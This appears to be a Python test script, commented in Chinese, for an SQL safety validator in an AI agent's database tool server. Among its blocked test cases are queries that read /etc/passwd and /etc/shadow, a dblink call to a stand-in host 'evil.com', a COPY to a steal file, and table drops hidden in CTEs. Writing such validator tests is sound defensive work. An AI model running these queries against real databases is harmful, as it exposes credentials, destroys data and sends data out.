"""
测试基于 sqlglot AST 的 SQL 安全校验。

覆盖场景：
1. 合法 SELECT 查询（应通过）
2. 字符串匹配会误杀但 AST 应放行的查询
3. 各种 DML/DDL 攻击（应拒绝）
4. 高风险函数（应拒绝）
5. 嵌套攻击（CTE/子查询中的写操作）
"""

import sys
sys.path.insert(0, "d:/Project/NanoAgent/mcp_server")

from security import _sql_safety_error

PASS = "PASS"
BLOCK = "BLOCK"


def check(sql: str, expect_pass: bool):
    error = _sql_safety_error(sql)
    actual_pass = error is None
    status = PASS if actual_pass else f"BLOCK: {error}"

    if actual_pass == expect_pass:
        print(f"  {status}")
        return True
    else:
        expected = PASS if expect_pass else BLOCK
        print(f"  FAIL! expected={expected}, actual={status}")
        return False


print("=" * 65)
print("1. 合法 SELECT 查询（应全部通过）")
print("=" * 65)
all_ok = True
for sql in [
    "SELECT * FROM products",
    "SELECT product_name, price FROM products WHERE category = 'electronics'",
    "SELECT p.name, COUNT(*) FROM products p JOIN sales_orders s ON p.id = s.product_id GROUP BY p.name",
    "SELECT * FROM insert_log WHERE created_at > '2026-01-01'",
    "SELECT * FROM products WHERE description LIKE '%insert%'",
    "SELECT * FROM users WHERE name = 'drop'",
    "WITH monthly_sales AS (SELECT product_id, SUM(total_amount) as total FROM sales_orders WHERE order_date >= '2026-01-01' GROUP BY product_id) SELECT * FROM monthly_sales ORDER BY total DESC",
    "WITH RECURSIVE t(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM t WHERE n < 10) SELECT * FROM t",
    "SELECT * FROM (SELECT * FROM products) sub",
    "SELECT SUBSTRING(description, 1, 100) FROM products",
]:
    label = sql[:70] + ("..." if len(sql) > 70 else "")
    print(f"\n  [{label}]")
    if not check(sql, expect_pass=True):
        all_ok = False

print(f"\n  {'='*50}")
print(f"  结果: {'全部通过' if all_ok else '存在失败!'}")

print("\n" + "=" * 65)
print("2. 旧版字符串匹配会误杀的场景（AST 应全部通过）")
print("=" * 65)
all_ok = True
for sql in [
    "SELECT * FROM insert_log",           # 表名含 insert
    "SELECT * FROM update_records",        # 表名含 update
    "SELECT * FROM delete_archive",        # 表名含 delete
    "SELECT * FROM products WHERE name = 'drop table'",  # 字符串字面量含 drop
    "SELECT * FROM orders WHERE status = 'created'",     # 字段值含 create
    "SELECT * FROM users WHERE bio LIKE '%alter ego%'",  # 字符串含 alter
    "/* 查询所有已发货订单 */ SELECT * FROM sales_orders WHERE order_status = '已发货'",  # 注释开头
]:
    label = sql[:70] + ("..." if len(sql) > 70 else "")
    print(f"\n  [{label}]")
    if not check(sql, expect_pass=True):
        all_ok = False

print(f"\n  {'='*50}")
print(f"  结果: {'全部通过' if all_ok else '存在失败!'}")

print("\n" + "=" * 65)
print("3. DML/DDL 攻击（应全部拒绝）")
print("=" * 65)
all_ok = True
for sql in [
    "INSERT INTO products VALUES (1, 'x', 10)",
    "UPDATE products SET price = 0",
    "DELETE FROM products WHERE id = 1",
    "DROP TABLE products",
    "ALTER TABLE products ADD COLUMN x INT",
    "CREATE TABLE hack(id INT)",
    "TRUNCATE TABLE products",
    "GRANT SELECT ON products TO attacker",
    "REVOKE SELECT ON products FROM attacker",
    "COPY products TO '/tmp/steal.csv'",
    "EXECUTE malicious_function()",
    "MERGE INTO products USING source ON products.id = source.id WHEN MATCHED THEN UPDATE SET price = 0",
]:
    label = sql[:70] + ("..." if len(sql) > 70 else "")
    print(f"\n  [{label}]")
    if not check(sql, expect_pass=False):
        all_ok = False

print(f"\n  {'='*50}")
print(f"  结果: {'全部被拦截' if all_ok else '存在放行!'}")

print("\n" + "=" * 65)
print("4. 高风险函数（应全部拒绝）")
print("=" * 65)
all_ok = True
for sql in [
    "SELECT pg_sleep(10)",
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT dblink_connect('host=evil.com')",
    "SELECT lo_import('/etc/shadow')",
    "SELECT pg_terminate_backend(12345)",
    "SELECT pg_ls_dir('/')",
    "SELECT 1 FROM products WHERE id = 1; SELECT pg_sleep(10)",  # 多语句
]:
    label = sql[:70] + ("..." if len(sql) > 70 else "")
    print(f"\n  [{label}]")
    if not check(sql, expect_pass=False):
        all_ok = False

print(f"\n  {'='*50}")
print(f"  结果: {'全部被拦截' if all_ok else '存在放行!'}")

print("\n" + "=" * 65)
print("5. CTE/子查询嵌套攻击（应全部拒绝）")
print("=" * 65)
all_ok = True
for sql in [
    "WITH deleted AS (DELETE FROM products WHERE id = 1 RETURNING *) SELECT * FROM deleted",
    "WITH inserted AS (INSERT INTO products VALUES (99, 'hack', 0) RETURNING *) SELECT * FROM inserted",
    "WITH updated AS (UPDATE products SET price = 0 RETURNING *) SELECT * FROM updated",
    "WITH dropped AS (DROP TABLE products) SELECT 1",
    "SELECT * FROM (INSERT INTO products VALUES (1) RETURNING *) sub",
]:
    label = sql[:70] + ("..." if len(sql) > 70 else "")
    print(f"\n  [{label}]")
    if not check(sql, expect_pass=False):
        all_ok = False

print(f"\n  {'='*50}")
print(f"  结果: {'全部被拦截' if all_ok else '存在放行!'}")

print("\n" + "=" * 65)
print("6. 边界情况")
print("=" * 65)
print(f"\n  [空字符串]")
check("", expect_pass=False)
print(f"\n  [超长 SQL]")
check("SELECT " + "x, " * 2001 + "1", expect_pass=False)
